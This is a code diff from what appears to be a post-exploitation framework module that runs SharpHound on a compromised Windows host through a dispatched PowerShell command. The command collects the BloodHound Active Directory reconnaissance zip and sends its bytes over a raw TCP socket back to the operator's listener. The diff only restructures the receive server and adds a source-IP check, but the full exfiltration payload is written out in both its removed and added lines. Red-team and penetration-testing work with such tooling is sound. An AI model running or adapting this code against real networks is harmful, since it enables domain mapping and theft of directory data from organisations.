@@ -96,40 +96,43 @@ class SharpHoundModule(KoiModule):
     ) -> tuple[str, bytes]:
         """Run SharpHound on target, return (status, payload)."""
         local_ip = self._get_local_ip()
-        srv  = TCPReceiveServer(timeout=timeout).start()
-        port = srv.port
+        with TCPReceiveServer(
+            timeout=timeout, expected_ip=self.session.addr[0],
+        ) as srv:
+            port = srv.port
 
-        ps_cmd = (
-            f"$ErrorActionPreference='Continue';"
-            f"$work=(Get-Item '{work_dir}').FullName;"
-            f"$exe=Join-Path $work '{exe_name}';"
-            f"$log=Join-Path $work '{log_name}';"
-            f"$payload=$null;"
-            f"try{{"
-            f"  Push-Location $work;"
-            f"  & $exe -c {collection} --outputdirectory $work *>&1 | Out-File -FilePath $log -Encoding utf8;"
-            f"  Pop-Location;"
-            f"  $zip=Get-ChildItem -Path $work -Filter '*_BloodHound.zip' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName;"
-            f"  if($zip -and (Test-Path $zip)){{"
-            f"    $b=[IO.File]::ReadAllBytes($zip);"
-            f"    $h=[Text.Encoding]::UTF8.GetBytes('OK:');"
-            f"    $payload=New-Object byte[] ($h.Length+$b.Length);"
-            f"    [Array]::Copy($h,0,$payload,0,$h.Length);"
-            f"    [Array]::Copy($b,0,$payload,$h.Length,$b.Length);"
-            f"  }}else{{"
-            f"    $logTxt=if(Test-Path $log){{[IO.File]::ReadAllText($log)}}else{{'(no log file produced)'}};"
-            f"    $payload=[Text.Encoding]::UTF8.GetBytes('ERR:'+$logTxt);"
-            f"  }}"
-            f"}}catch{{"
-            f"  $payload=[Text.Encoding]::UTF8.GetBytes('EXC:'+$_.ToString());"
-            f"}}"
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-            f"$_s=$_c.GetStream();"
-            f"$_s.Write($payload,0,$payload.Length);"
-            f"$_s.Flush();$_c.Close()"
-        )
-        self._dispatch_ps(ps_cmd)
-        data = srv.collect()
+            ps_cmd = (
+                f"$ErrorActionPreference='Continue';"
+                f"$work=(Get-Item '{work_dir}').FullName;"
+                f"$exe=Join-Path $work '{exe_name}';"
+                f"$log=Join-Path $work '{log_name}';"
+                f"$payload=$null;"
+                f"try{{"
+                f"  Push-Location $work;"
+                f"  & $exe -c {collection} --outputdirectory $work *>&1 | Out-File -FilePath $log -Encoding utf8;"
+                f"  Pop-Location;"
+                f"  $zip=Get-ChildItem -Path $work -Filter '*_BloodHound.zip' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName;"
+                f"  if($zip -and (Test-Path $zip)){{"
+                f"    $b=[IO.File]::ReadAllBytes($zip);"
+                f"    $h=[Text.Encoding]::UTF8.GetBytes('OK:');"
+                f"    $payload=New-Object byte[] ($h.Length+$b.Length);"
+                f"    [Array]::Copy($h,0,$payload,0,$h.Length);"
+                f"    [Array]::Copy($b,0,$payload,$h.Length,$b.Length);"
+                f"  }}else{{"
+                f"    $logTxt=if(Test-Path $log){{[IO.File]::ReadAllText($log)}}else{{'(no log file produced)'}};"
+                f"    $payload=[Text.Encoding]::UTF8.GetBytes('ERR:'+$logTxt);"
+                f"  }}"
+                f"}}catch{{"
+                f"  $payload=[Text.Encoding]::UTF8.GetBytes('EXC:'+$_.ToString());"
+                f"}}"
+                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
+                f"$_s=$_c.GetStream();"
+                f"$_s.Write($payload,0,$payload.Length);"
+                f"$_s.Flush();$_c.Close()"
+            )
+            self._dispatch_ps(ps_cmd)
+            data = srv.collect()
+
         if data.startswith(b"OK:"):
             return "ok", data[3:]
         if data.startswith(b"ERR:"):
